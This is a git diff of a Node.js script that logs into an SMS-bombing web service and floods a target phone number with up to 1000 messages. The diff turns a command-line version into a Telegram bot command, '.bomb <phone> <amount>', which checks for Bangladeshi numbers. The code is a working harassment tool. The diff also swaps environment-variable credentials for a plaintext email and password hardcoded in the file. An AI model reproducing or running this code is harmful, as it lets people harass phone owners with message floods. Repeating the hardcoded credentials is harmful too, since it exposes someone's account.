@@ -3,34 +3,27 @@ const { CookieJar } = require('tough-cookie');
 const { wrapper } = require('axios-cookiejar-support');
 const cheerio = require('cheerio');
 const FormData = require('form-data');
-const readline = require('readline');
 
-// Load environment variables
-require('dotenv').config();
-
-const email = process.env.EMAIL || 'your_email@example.com';
-const password = process.env.PASSWORD || 'your_password';
+// 🔐 Login credentials
+const email = 'maxjihad59@gmail.com';
+const password = 'Likhon@#12';
 
 const jar = new CookieJar();
-const client = wrapper(axios.create({ 
+const client = wrapper(axios.create({
   jar,
   timeout: 10000,
   maxRedirects: 5
 }));
 
+// ✅ Login function
 async function login() {
   try {
-    console.log('Fetching login page...');
     const loginPage = await client.get('https://www.pikachutools.my.id/user/login');
-    
     const $ = cheerio.load(loginPage.data);
     const token = $('input[name="_token"]').val();
-    
-    if (!token) {
-      throw new Error('CSRF token not found');
-    }
 
-    console.log('Attempting login...');
+    if (!token) throw new Error('CSRF token not found');
+
     const loginRes = await client.post(
       'https://www.pikachutools.my.id/user/login',
       `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&_token=${encodeURIComponent(token)}`,
@@ -43,113 +36,85 @@ async function login() {
       }
     );
 
-    if ([301, 302].includes(loginRes.status) || loginRes.request?.path?.includes('/user')) {
-      console.log('Login successful!');
-      return true;
-    }
-    
-    throw new Error('Login failed - unknown response');
-
+    return loginRes.status === 200 || loginRes.request.path.includes('/user');
   } catch (e) {
-    console.error('⚠️ Login error:', e.message);
-    console.error('Details:', e.response?.data || 'No response data');
+    console.error('❌ Login Error:', e.message);
     return false;
   }
 }
 
+// ✅ Send bomb function
 async function sendBomb(phone, amount) {
   try {
-    console.log('Fetching user page for CSRF token...');
     const userPage = await client.get('https://www.pikachutools.my.id/user');
     const $ = cheerio.load(userPage.data);
     const token = $('input[name="_token"]').val();
-    
-    if (!token) {
-      throw new Error('CSRF token not found on user page');
-    }
 
-    console.log('Preparing bomb request...');
+    if (!token) throw new Error('CSRF token not found on user page');
+
     const form = new FormData();
     form.append('_token', token);
     form.append('nomor', phone);
     form.append('jumlah', amount);
 
-    console.log('Sending bomb request...');
-    const res = await client.post(
-      'https://www.pikachutools.my.id/user', 
-      form,
-      {
-        headers: {
-          ...form.getHeaders(),
-          'Origin': 'https://www.pikachutools.my.id',
-          'Referer': 'https://www.pikachutools.my.id/user'
-        }
+    const res = await client.post('https://www.pikachutools.my.id/user', form, {
+      headers: {
+        ...form.getHeaders(),
+        'Origin': 'https://www.pikachutools.my.id',
+        'Referer': 'https://www.pikachutools.my.id/user'
       }
-    );
+    });
 
     if (res.data?.status === true) {
-      return `✅ Bomb successfully sent to ${phone} (${amount} requests)`;
+      return `✅ Bomb sent to ${phone} (${amount}x)`;
     }
-    
-    return `❌ Bomb failed. Response: ${JSON.stringify(res.data, null, 2)}`;
 
+    return `❌ Bomb failed: ${JSON.stringify(res.data)}`;
   } catch (e) {
-    console.error('⚠️ Send Bomb error:', e.message);
-    console.error('Details:', e.response?.data || 'No response data');
-    return `🚨 Critical error: ${e.message}`;
+    console.error('❌ Bomb error:', e.message);
+    return `❌ Error: ${e.message}`;
   }
 }
 
-// Command line interface
-function setupCLI() {
-  const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-  });
+// ✅ Telegram bot command handler
+module.exports = (bot) => {
+  bot.on('message', async (msg) => {
+    const text = msg.text?.trim();
+    const chatId = msg.chat.id;
 
-  console.log(`
-  \x1b[36m
-  ██████╗  ██████╗ ███╗   ███╗██████╗ 
-  ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
-  ██████╔╝██║   ██║██╔████╔██║██████╔╝
-  ██╔══██╗██║   ██║██║╚██╔╝██║██╔═══╝ 
-  ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║     
-  ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     
-  \x1b[0m
-  Commands:
-  - bomb [phone] [amount] - Send SMS bomb
-  - exit - Quit the program
-  `);
+    if (!text || !text.startsWith('.bomb')) return;
 
-  rl.on('line', async (input) => {
-    const [command, ...args] = input.trim().split(' ');
-    
-    if (command === 'bomb') {
-      const [phone, amount] = args;
-      if (!phone || !amount) {
-        console.log('❌ Usage: bomb [phone] [amount]');
-        return;
+    const parts = text.split(' ');
+    if (parts.length !== 3) {
+      return bot.sendMessage(chatId, '❌ ফরম্যাট: `.bomb <phone> <amount>`');
+    }
+
+    const phone = parts[1];
+    const amount = parseInt(parts[2]);
+
+    if (!/^01[0-9]{8,9}$/.test(phone)) {
+      return bot.sendMessage(chatId, '❌ সঠিক বাংলাদেশি নাম্বার দিন (01 দিয়ে)');
+    }
+
+    if (isNaN(amount) || amount <= 0 || amount > 1000) {
+      return bot.sendMessage(chatId, '❌ এমাউন্ট ভুল! ১ থেকে ১০০০ পর্যন্ত দিন।');
+    }
+
+    try {
+      await bot.sendMessage(chatId, '🔐 লগইন হচ্ছে...');
+      const ok = await login();
+
+      if (!ok) {
+        return bot.sendMessage(chatId, '❌ লগইন ব্যর্থ! ইমেইল/পাসওয়ার্ড ভুল।');
       }
-      
-      const loggedIn = await login();
-      if (loggedIn) {
-        const result = await sendBomb(phone, amount);
-        console.log(result);
-      }
-    } else if (command === 'exit') {
-      rl.close();
-    } else {
-      console.log('❌ Unknown command');
+
+      await bot.sendMessage(chatId, `🚀 বোম্ব শুরু: ${phone} (${amount})`);
+      const result = await sendBomb(phone, amount);
+
+      return bot.sendMessage(chatId, result);
+    } catch (err) {
+      console.error('❌ Command error:', err.message);
+      return bot.sendMessage(chatId, `❌ ত্রুটি: ${err.message}`);
     }
   });
-
-  rl.on('close', () => {
-    console.log('👋 Goodbye!');
-    process.exit(0);
-  });
-}
-
-// Run the program
-setupCLI();
-
-module.exports = { login, sendBomb };
+};
